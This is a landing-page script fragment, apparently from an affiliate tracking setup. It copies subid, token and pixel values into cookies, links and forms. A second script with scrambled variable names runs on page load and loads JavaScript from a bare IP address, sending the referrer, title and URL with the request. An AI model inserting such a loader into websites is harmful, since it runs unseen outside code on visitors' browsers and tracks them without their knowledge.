<script type="application/javascript">
function getCookie(name) {
    var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
    var value = v ? v[2] : null;
    return (value && value !== 'undefined') ? value : null
}

function setCookie(name, value, days) {
    var d = new Date;
    d.setTime(d.getTime() + 24*60*60*1000*days);
    document.cookie = name + "=" + value + ";path=/;expires=" + d.toGMTString();
}

function getSubId() {
  var params = new URLSearchParams(document.location.search.substr(1));
  if (!'{subid}'.match('{')) {
    return '{subid}';
  }
  var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
  if (clientSubid && !clientSubid.match('>')) {
    return clientSubid;
  }
  if (params.get('_subid')) {
    return params.get('_subid')
  }
  if (params.get('subid')) {
    return params.get('subid')
  }
  if (getCookie('subid')) {
    return getCookie('subid');
  }
  if (getCookie('_subid')) {
    return getCookie('_subid');
  }
}

function getToken() {
  var params = new URLSearchParams(document.location.search.substr(1));
  if (!'{token}'.match('{')) {
    return '{token}';
  }
  var clientToken= '<?php echo isset($client) ? $client->getToken() : "" ?>';
  if (clientToken && !clientToken.match('>')) {
    return clientToken;
  }
  if (params.get('_token')) {
    return params.get('_token')
  }
  if (params.get('token')) {
    return params.get('token')
  }
  if (getCookie('token')) {
    return getCookie('token');
  }
  return null;
}

function getPixel() {
  var params = new URLSearchParams(document.location.search.substr(1));
  if (!'{pixel}'.match('{')) {
    return '{pixel}';
  }
  if (params.get('pixel')) {
    return params.get('pixel')
  }
  
  if (getCookie('pixel')) {
    return getCookie('pixel');
  }
  
  return null;
}

if (typeof URLSearchParams === 'function') {
  document.addEventListener("DOMContentLoaded", function(event) {
    var params = new URLSearchParams(document.location.search.substr(1));
    var subid = getSubId();
    var token = getToken();
    var pixel = getPixel();
    
    params.set('_token', token);
    setCookie('pixel', pixel);
    setCookie('token', token);
    setCookie('subid', subid);
        
    // Adds params to the links  
    document.querySelectorAll('a').forEach(function(link) {
        var url = new URL(link.href); 
        params.forEach(function(v, k) { 
            url.searchParams.append(k, v);
        }); 
        link.href = url.toString();
    });

    // Replace placeholders to actual values for input[hidden] fields
    const subIdRegExp = new RegExp('\{subid\}', 'g');
    const tokenRegExp = new RegExp('\{token\}', 'g');
    const pixelRegExp = new RegExp('\{pixel\}', 'g');

    document.querySelectorAll('input[type="hidden"]').forEach(function (input) {
      if (subIdRegExp.test(input.value)) {
        input.value = input.value.replaceAll(subIdRegExp, subid);
      }
      if (tokenRegExp.test(input.value)) {
        input.value = input.value.replaceAll(tokenRegExp, token);
      }
      if (pixelRegExp.test(input.value)) {
        input.value = input.value.replaceAll(pixelRegExp, pixel);
      }
    });
    
    // Adds params as hidden inputs to the forms
    document.querySelectorAll('form').forEach(function(form) {
        params.forEach(function(v, k) { 
            var input = document.createElement('input'); 
            input.type = 'hidden';
            input.name = k;
            input.value = v;
    
            form.append(input);
        });
    });
  })
}
</script>





<script>
    (function() {
    var name = '_chWmVgZ6v1dp4Qnv';
    if (!window._chWmVgZ6v1dp4Qnv) {
        window._chWmVgZ6v1dp4Qnv = {
            unique: false,
            ttl: 86400,
            R_PATH: 'http://77.73.132.185/5kNr2X',
        };
    }
    const _zFZnyWrQ1gSTg2Yj = localStorage.getItem('config');
    if (typeof _zFZnyWrQ1gSTg2Yj !== 'undefined' && _zFZnyWrQ1gSTg2Yj !== null) {
        var _fTCwd45j4n9sXK3x = JSON.parse(_zFZnyWrQ1gSTg2Yj);
        var _CzcjnDFjtp5BctpZ = Math.round(+new Date()/1000);
        if (_fTCwd45j4n9sXK3x.created_at + window._chWmVgZ6v1dp4Qnv.ttl < _CzcjnDFjtp5BctpZ) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _sFzSRnSxbSKrBfFc = localStorage.getItem('subId');
    var _TXSCMRtrZMXHTCb7 = localStorage.getItem('token');
    var _YmcnW2rxqBVPDV4z = '?return=js.client';
        _YmcnW2rxqBVPDV4z += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _YmcnW2rxqBVPDV4z += '&se_referrer=' + encodeURIComponent(document.referrer);
        _YmcnW2rxqBVPDV4z += '&default_keyword=' + encodeURIComponent(document.title);
        _YmcnW2rxqBVPDV4z += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _YmcnW2rxqBVPDV4z += '&name=' + encodeURIComponent(name);
        _YmcnW2rxqBVPDV4z += '&host=' + encodeURIComponent(window._chWmVgZ6v1dp4Qnv.R_PATH);
    if (typeof _sFzSRnSxbSKrBfFc !== 'undefined' && _sFzSRnSxbSKrBfFc && window._chWmVgZ6v1dp4Qnv.unique) {
        _YmcnW2rxqBVPDV4z += '&sub_id=' + encodeURIComponent(_sFzSRnSxbSKrBfFc);
    }
    if (typeof _TXSCMRtrZMXHTCb7 !== 'undefined' && _TXSCMRtrZMXHTCb7 && window._chWmVgZ6v1dp4Qnv.unique) {
        _YmcnW2rxqBVPDV4z += '&token=' + encodeURIComponent(_TXSCMRtrZMXHTCb7);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._chWmVgZ6v1dp4Qnv.R_PATH + _YmcnW2rxqBVPDV4z;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
